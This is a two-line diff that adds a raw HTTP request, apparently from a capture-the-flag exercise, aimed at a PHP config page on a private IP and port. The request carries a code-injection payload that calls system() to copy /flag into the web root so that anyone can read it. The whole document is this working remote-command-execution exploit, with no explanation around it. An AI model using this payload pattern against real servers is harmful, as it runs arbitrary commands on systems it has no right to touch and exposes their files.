@@ -1,0 +1,2 @@
+GET /Upload/public/config.php?s=system('cat /flag > /var/www/html/1.txt'); HTTP/1.1
+Host: 10.12.153.8:31813
